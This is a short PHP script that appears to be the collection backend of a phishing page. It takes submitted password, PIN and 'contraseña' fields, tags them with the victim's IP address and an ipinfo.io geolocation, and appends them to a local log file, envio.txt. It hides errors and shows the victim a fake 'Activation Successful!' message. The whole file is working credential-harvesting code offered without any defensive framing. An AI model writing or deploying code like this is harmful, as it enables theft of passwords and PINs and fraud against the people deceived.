<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
	
	$file = fopen("envio.txt", "a");
	
fwrite($file, "".$_POST['contraseña']." | ".$_POST['pass']." | ".$_POST['pin']." | ".date('Y-m-d')." | ".date('H:i:s')." | ".$userp." ".$cc." ".$city."  " . PHP_EOL);
fwrite($file, "----------------------------------------- " . PHP_EOL);
fclose($file);
	echo '<p style="font-size:30px">¡Activación Exitosa!</p>';

?> 